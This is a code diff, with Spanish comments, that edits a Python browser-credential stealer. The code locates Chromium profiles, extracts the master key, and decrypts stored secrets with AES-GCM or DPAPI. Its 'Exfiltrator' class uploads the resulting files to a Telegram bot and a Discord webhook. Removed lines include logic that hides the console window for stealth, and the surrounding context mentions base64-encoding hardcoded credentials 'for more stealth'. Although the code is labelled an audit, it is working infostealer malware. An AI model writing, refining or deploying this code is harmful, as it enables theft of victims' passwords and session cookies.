@@ -14,8 +14,6 @@ import requests
 from pathlib import Path
 from datetime import datetime
 
-__version__ = "1.2.0"
-
 # =========================================================================
 # CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para mayor sigilo)
 # =========================================================================
@@ -39,15 +37,9 @@ def safe_b64_decode(val):
         return val
 
 try:
-    import win32crypt
+    win32crypt = importlib.import_module('win32crypt')
 except ImportError:
     win32crypt = None
-
-# Ocultar consola inmediatamente si es un ejecutable (frozen)
-if getattr(sys, 'frozen', False):
-    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-    if hwnd:
-        ctypes.windll.user32.ShowWindow(hwnd, 0)
 
 from Cryptodome.Cipher import AES
 
@@ -147,23 +139,8 @@ HTML_TEMPLATE = """
 </html>
 """
 
-REQUEST_TIMEOUT = 15
-MAX_RETRIES     = 3
+REQUEST_TIMEOUT = 10
 VALID_URL_PREFIXES = ('http://', 'https://')
-
-
-def retry_request(func):
-    """Decorador simple para reintentar peticiones HTTP en caso de problemas de red."""
-    def wrapper(*args, **kwargs):
-        for i in range(MAX_RETRIES):
-            try:
-                return func(*args, **kwargs)
-            except (requests.exceptions.RequestException, Exception) as e:
-                logger.warning(f"Intento {i+1}/{MAX_RETRIES} fallido: {e}")
-                if i == MAX_RETRIES - 1:
-                    raise
-        return False
-    return wrapper
 
 
 class Exfiltrator:
@@ -172,38 +149,46 @@ class Exfiltrator:
         self.telegram_chat_id = telegram_chat_id
         self.discord_webhook  = discord_webhook
 
-    @retry_request
     def send_to_telegram(self, file_path):
         if not self.telegram_token or not self.telegram_chat_id:
             return False
         url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
-        with open(file_path, 'rb') as f:
-            response = requests.post(
-                url,
-                data={'chat_id': self.telegram_chat_id},
-                files={'document': f},
-                timeout=REQUEST_TIMEOUT
-            )
-        if response.status_code == 200:
-            logger.info("Exfiltración vía Telegram exitosa.")
-            return True
-        logger.error(f"Telegram HTTP {response.status_code}: {response.text[:200]}")
+        try:
+            with open(file_path, 'rb') as f:
+                response = requests.post(
+                    url,
+                    data={'chat_id': self.telegram_chat_id},
+                    files={'document': f},
+                    timeout=REQUEST_TIMEOUT
+                )
+            if response.status_code == 200:
+                logger.info("Exfiltración vía Telegram exitosa.")
+                return True
+            logger.error(f"Telegram HTTP {response.status_code}: {response.text[:200]}")
+        except requests.exceptions.Timeout:
+            logger.error("Timeout: Telegram no respondió.")
+        except Exception as e:
+            logger.error(f"Falla Telegram: {e}")
         return False
 
-    @retry_request
     def send_to_discord(self, file_path):
         if not self.discord_webhook:
             return False
-        with open(file_path, 'rb') as f:
-            response = requests.post(
-                self.discord_webhook,
-                files={'file': f},
-                timeout=REQUEST_TIMEOUT
-            )
-        if response.status_code in (200, 204):
-            logger.info("Exfiltración vía Discord exitosa.")
-            return True
-        logger.error(f"Discord HTTP {response.status_code}: {response.text[:200]}")
+        try:
+            with open(file_path, 'rb') as f:
+                response = requests.post(
+                    self.discord_webhook,
+                    files={'file': f},
+                    timeout=REQUEST_TIMEOUT
+                )
+            if response.status_code in (200, 204):
+                logger.info("Exfiltración vía Discord exitosa.")
+                return True
+            logger.error(f"Discord HTTP {response.status_code}: {response.text[:200]}")
+        except requests.exceptions.Timeout:
+            logger.error("Timeout: Discord no respondió.")
+        except Exception as e:
+            logger.error(f"Falla Discord: {e}")
         return False
 
 
@@ -233,44 +218,14 @@ class ChromiumDecryptor:
             return None
 
     def decrypt(self, blob, key):
-        """Descifra datos de Chromium con fallback mejorado para versiones sin prefijo estándar."""
-        if not blob:
-            return ""
-        
-        if not isinstance(blob, (bytes, bytearray)):
-            try:
-                blob = bytes(blob)
-            except Exception:
-                return "[Error: Formato de datos inválido]"
-
-        if len(blob) < 3:
-            return "[Error: Dato muy corto]"
-
+        # 3 (prefijo v10) + 12 (nonce) + 1 (payload) + 16 (tag GCM) = 32 bytes mínimo
+        if not isinstance(blob, (bytes, bytearray)) or len(blob) < 32:
+            return "[Blob inválido]"
         try:
-            # Caso 1: Intentar AES-GCM si tenemos la Master Key y longitud suficiente
-            # Somos más permisivos que antes: si tiene longitud de AES, probamos aunque falte el prefijo 'v10'
-            if key and len(blob) >= 32:
-                try:
-                    nonce   = blob[3:15]
-                    payload = blob[15:-16]
-                    cipher  = AES.new(key, AES.MODE_GCM, nonce)
-                    decrypted = cipher.decrypt(payload)
-                    return decrypted.decode('utf-8', errors='replace')
-                except Exception:
-                    # Si falla el intento de AES, bajamos al método Legacy DPAPI
-                    pass
-
-            # Caso 2: Legacy DPAPI (para versiones muy antiguas o blobs específicos)
-            if win32crypt:
-                decrypted = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
-                return decrypted.decode('utf-8', errors='replace')
-            
-            return "[Error: Falta pywin32 para Legacy]"
-
-        except Exception as e:
-            err_type = type(e).__name__
-            logger.debug(f"Falla en descifrado ({err_type}): {e}")
-            return f"[Error: {err_type}]"
+            cipher = AES.new(key, AES.MODE_GCM, blob[3:15])
+            return cipher.decrypt(blob[15:-16]).decode()
+        except Exception:
+            return "[Error al descifrar]"
 
     def audit(self, fmt="html", out="audit_report"):
         data    = []
@@ -282,16 +237,13 @@ class ChromiumDecryptor:
             key = self.get_key(path)
             if not key:
                 continue
-            profs = []
             try:
-                # Detección exhaustiva de perfiles (Default, Profile X, o carpeta base si no hay subcarpetas)
                 profs = [p for p in path.iterdir()
                          if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
-            except Exception as e:
-                logger.warning(f"Error detectando perfiles en {name}: {e}")
-
+            except PermissionError:
+                logger.warning(f"Sin permisos para leer perfiles de {name}.")
+                continue
             if not profs:
-                # Algunos navegadores (como Opera antiguo o versiones custom) usan la ruta base directamente
                 profs = [path]
 
             for p in profs:
